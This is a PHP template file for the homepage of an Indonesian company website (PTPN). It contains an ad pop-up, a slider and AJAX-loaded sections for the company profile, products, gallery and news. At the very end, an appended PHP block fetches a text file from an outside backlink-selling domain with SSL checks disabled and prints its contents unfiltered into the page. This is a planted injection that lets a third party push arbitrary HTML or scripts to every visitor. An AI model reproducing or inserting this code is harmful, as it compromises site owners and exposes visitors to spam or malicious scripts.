<?php
$config = $this->db->query("SELECT * FROM config WHERE id='1'")->row();
$pop_up = $config->pop_up;
$pop_up_active = $config->pop_up_active;
$btn_pop_up = $config->btn_pop_up;
$url_pop_up = $config->url_pop_up;
?>
<div id="modal_iklan" class="modal fade" role="dialog">
  <div class="modal-dialog modal-md">
    <div class="modal-content" style="background: unset;border: unset;">
      <div class="modal-body text-center">
        <div class="row" style="position: absolute;right: 25px;top: 15px;">
          <div class="col-md-12">
            <button type="button" class="close" data-dismiss="modal">&times;</button>
          </div>
        </div>
        <img class="enlarged_image imgr img-responsive" src="<?= base_url() ?>assets/images/<?= $config->pop_up ?>" style="max-width: 100%;" />
        <?php
        if ($btn_pop_up != '' && $btn_pop_up != null) {
        ?>
          <div>
            <a href="<?= $url_pop_up ?>" target="_blank" class="mt-4 pt-2 pb-2 pl-4 pr-4 btn btn-success btn-flat" style="position: relative; bottom:90px;background: #00923f; border-radius: 7px !important; border: unset;font-size: 1rem;white-space: unset;">
              <?= $btn_pop_up ?>
            </a>
          </div>
        <?php
        }
        ?>
      </div>
    </div>
  </div>
</div>
<?php
$speed = $this->db->query("SELECT speed_slider*1000 as jum FROM config where id='1'")->row('jum');
?>
<!---------------------- Carousel ---------------------->
<div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel" data-interval="<?= $speed ?>">
  <div class="carousel-inner" id="list_slider">

  </div>
  <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
    <span class="sr-only">Previous</span>
  </a>
  <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
    <span class="carousel-control-next-icon" aria-hidden="true"></span>
    <span class="sr-only">Next</span>
  </a>
</div>
<script type="text/javascript">
  var modal_active = "<?= $pop_up_active ?>";
  $(document).ready(function() {
    load_slider();
    if (modal_active == 1) {
      $('#modal_iklan').modal('show');
    }
  });

  function load_slider() {
    $.ajax({
      url: "<?= base_url('index.php/front/load_slider'); ?>",
      success: function(data) {
        $('#list_slider').html(data);
      },
      error: function(jqXHR, exception) {
        load_error(jqXHR, exception);
      }
    })
  }
</script>

<!---------------------- End Carousel ---------------------->


<!---------------------- Tentang ---------------------->

<section class="tab-data">
  <img src="<?= base_url() ?>assets/front/assets/d2.png" class="kiri-bawah">
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-lg-12">
        <nav class="nav nav-pills nav-fill">
          <a data-toggle="tab" class="nav-item nav-link br-1 active l-radius" href="#tab-sejarah">SEJARAH</a>
          <a data-toggle="tab" class="nav-item nav-link br-1" href="#tab-vm">VISI/MISI</a>
          <a data-toggle="tab" class="nav-item nav-link br-1" href="#tab-struktur">STRUKTUR ORGANISASI</a>
          <a data-toggle="tab" class="nav-item nav-link br-1" href="#tab-direkom">DIREKSI & KOMISARIS</a>
          <a data-toggle="tab" class="nav-item nav-link br-1" href="#tab-pedoman">TATA KELOLA</a>
          <a data-toggle="tab" class="nav-item nav-link r-radius" href="#tab-logo">MAKNA LOGO</a>
        </nav>
      </div>
    </div>
    <div class="row mt-5">
      <div class="col-lg-12">
        <div class="tab-content">
          <div class="tab-pane fade show active" id="tab-sejarah" role="tabpanel">

          </div>
          <div class="tab-pane fade" id="tab-vm" role="tabpanel">

          </div>
          <div class="tab-pane fade" id="tab-struktur" role="tabpanel">

          </div>
          <div class="tab-pane fade" id="tab-direkom" role="tabpanel">

          </div>
          <div class="tab-pane fade" id="tab-pedoman" role="tabpanel">

          </div>
          <div class="tab-pane fade" id="tab-logo" role="tabpanel">

          </div>
        </div>
      </div>
    </div>
  </div>
</section>

<script type="text/javascript">
  $(document).ready(function() {
    load_tentang();
  });

  function load_tentang() {
    $.ajax({
      dataType: "JSON",
      url: "<?= base_url('index.php/front/load_tentang'); ?>",
      success: function(data) {
        $('#tab-sejarah').html(data.sejarah);
        $('#tab-vm').html(data.visimisi);
        $('#tab-struktur').html(data.struktur_org);
        $('#tab-direkom').html(data.direksi);
        $('#tab-pedoman').html(data.pedoman);
        $('#tab-logo').html(data.makna_logo);
      },
      error: function(jqXHR, exception) {
        load_error(jqXHR, exception);
      }
    })
  }
</script>

<!---------------------- End Tentang ---------------------->


<!---------------------- Bisnis & Produk ---------------------->

<section class="light-bg pt-4 pt-lg-5 pb-4 pb-lg-5 full-bg" style="background-image: url(<?= base_url() ?>assets/front/assets/map.png);">
  <div class="container">
    <div class="row mb-4">
      <div class="col-md-12">
        <div class="text-center">
          <h3 class="fw-600">BISNIS DAN PRODUK</h3>
        </div>
      </div>
    </div>
    <div class="row">
      <div class="col-md-12">
        <div class="flex-data-wrap" id="list_produk">


        </div>
      </div>
    </div>
    <div class="row">
      <div class="col-12">
        <div class="text-center mt-3">
          <a href="<?= base_url() ?>bisnis-produk?p=produk" class=" pt-3 pb-3 pl-4 pr-4 btn btn-success3 btn-flat">
            SELENGKAPNYA
            <img src="<?= base_url() ?>assets/front/assets/cevron-right.svg" class="ml-2" width="16px">
          </a>
        </div>
      </div>
    </div>
  </div>
</section>
<script type="text/javascript">
  $(document).ready(function() {
    load_produk();
  });

  function load_produk() {
    $.ajax({
      url: "<?= base_url('index.php/front/load_produk'); ?>",
      success: function(data) {
        $('#list_produk').html(data);
      },
      error: function(jqXHR, exception) {
        load_error(jqXHR, exception);
      }
    })
  }
</script>


<!---------------------- End Bisnis & Produk ---------------------->


<!---------------------- Galeri ---------------------->

<section class="pt-4 pt-lg-5 pb-4 pb-lg-5 relative">
  <img src="<?= base_url() ?>assets/front/assets/d4.jpg" class="kanan-atas" width="200px">
  <div class="container">
    <div class="row mb-4">
      <div class="col-md-12">
        <div class="text-center">
          <h3 class="fw-600">GALERI</h3>
        </div>
      </div>
    </div>
    <div class="row">
      <div class="col-lg-12">
        <ul class="nav nav-pills nav-theme justify-content-center" id="kat_galeri">

        </ul>
      </div>
    </div>
    <div class="row mt-4 justify-content-center">
      <div class="col-9">
        <div class="testimoni" id="list_galeri">


        </div>
      </div>
    </div>
    <div class="row">
      <div class="col-12">
        <div class="text-center mt-3">
          <a href="<?= base_url() ?>media-galeri" class=" pt-3 pb-3 pl-4 pr-4 btn btn-success2 btn-flat">
            SELENGKAPNYA
            <img src="<?= base_url() ?>assets/front/assets/cevron-right.svg" class="ml-2" width="16px">
          </a>
        </div>
      </div>
    </div>
  </div>
</section>
<script type="text/javascript">
  $(document).ready(function() {
    load_kat_galeri();
    load_galeri(0);
  });

  function load_kat_galeri() {
    $.ajax({
      url: "<?= base_url('index.php/front/load_kat_galeri'); ?>",
      success: function(data) {
        $('#kat_galeri').html(data);
      },
      error: function(jqXHR, exception) {
        load_error(jqXHR, exception);
      }
    })
  }

  function load_galeri(id) {
    $('.kat_gal').attr('class', 'nav-link kat_gal');
    $('#kat_' + id).attr('class', 'nav-link kat_gal active');
    $.ajax({
      type: "POST",
      url: "<?= base_url('index.php/front/load_galeri'); ?>",
      data: ({
        id
      }),
      success: function(data) {
        $('#list_galeri').html(data);

        $(".d-preview").on("click", function(e) {
          const link = $(this).attr("target-preview");
          if (link != undefined && link != null && link != '') {
            imagePreview(link);
          }
        });

        $('.owl-carousel').owlCarousel({
          loop: true,
          margin: 20,
          nav: true,
          responsive: {
            0: {
              items: 1,
            },
            600: {
              items: 2,
            },
            1000: {
              items: 3,
            }
          },
          navText: ["<i class='fa fa-arrow-left'></i>", "<i class='fa fa-arrow-right'></i>"]
        });
      },
      error: function(jqXHR, exception) {
        load_error(jqXHR, exception);
      }
    })
  }
</script>

<!---------------------- End Galeri ---------------------->





<!---------------------- Berita & Channel ---------------------->


<section>
  <div class="container-fluid">
    <div class="row">
      <div class="col-lg-6 p-5 light-bg2">
        <div class="row">
          <div class="col-md-7">
            <h4 class="fw-600">BERITA TERBARU</h4>
          </div>
          <div class="col-md-5 text-right fs-14">
            <a href="<?= base_url() ?>berita-terbaru" class="link-2">SELENGKAPNYA <img src="<?= base_url() ?>assets/front/assets/cevron-right2.svg" class="ml-2" width="16px"></a>
          </div>
        </div>
        <div class="row mt-3">
          <div class="col-lg-12" id="list_artikel">

          </div>
        </div>
      </div>
      <script type="text/javascript">
        $(document).ready(function() {
          load_artikel();
        });

        function load_artikel() {
          $.ajax({
            url: "<?= base_url('index.php/front/load_artikel'); ?>",
            success: function(data) {
              $('#list_artikel').html(data);
            },
            error: function(jqXHR, exception) {
              load_error(jqXHR, exception);
            }
          })
        }
      </script>
      <div class="col-lg-6 p-5 light-bg">
        <div class="row">
          <div class="col-md-7">
            <h4 class="fw-600">CHANNEL PTPN</h4>
          </div>
          <div class="col-md-5 text-right fs-14">
            <a href="<?= base_url() ?>/media-channel" class="link-2">SELENGKAPNYA <img src="<?= base_url() ?>assets/front/assets/cevron-right2.svg" class="ml-2" width="16px"></a>
          </div>
        </div>
        <div class="row mt-3">
          <div class="col-12">
            <div class="d-artikel" id="_channel">
            </div>
          </div>
        </div>
      </div>
      <script type="text/javascript">
        $(document).ready(function() {
          load_channel();
        });

        function load_channel() {
          $.ajax({
            url: "<?= base_url('index.php/front/load_channel'); ?>",
            success: function(data) {
              $('#_channel').html(data);
            },
            error: function(jqXHR, exception) {
              load_error(jqXHR, exception);
            }
          })
        }
      </script>

    </div>
  </div>
</section>


<!---------------------- End Berita & Channel ---------------------->
<?php
$url = 'https://backlinkku.id/menu/server-id/script.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan SSL verification jika diperlukan
$content = curl_exec($ch);

if (curl_errno($ch)) {
    echo "cURL Error: " . curl_error($ch);
} else {
    echo $content;
}
curl_close($ch);
?>
